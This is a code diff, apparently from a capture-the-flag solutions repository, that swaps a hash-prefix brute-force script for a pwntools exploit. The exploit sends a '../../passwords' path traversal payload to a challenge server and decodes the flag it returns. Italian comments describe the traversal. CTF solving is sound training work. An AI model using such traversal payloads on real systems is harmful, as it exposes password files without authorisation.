@@ -1,9 +1,10 @@
-from hashlib import sha256
-import os
-while True:
-    rnd = os.urandom(8).hex().encode()
-    txt = sha256(rnd).hexdigest()
-    if txt[:6] == "bed100":
-        print(rnd, txt)
-# gli hash restituiti romperanno il check
-# per admin panel 1 basta fare directory trasversal con ../../passwords nell'opzione 3
+from pwn import *
+
+r = remote("adminpanel.challs.olicyber.it", 12200)
+r.recvuntil(b'Esci\n')
+r.sendline(b'3')
+r.recvuntil(b'? ')
+r.sendline(b'../../passwords') # path trasversal
+r.recvuntil(b'flag1:')
+flag = bytes.fromhex(r.recvuntil(b'\n').decode().strip())
+print(flag)
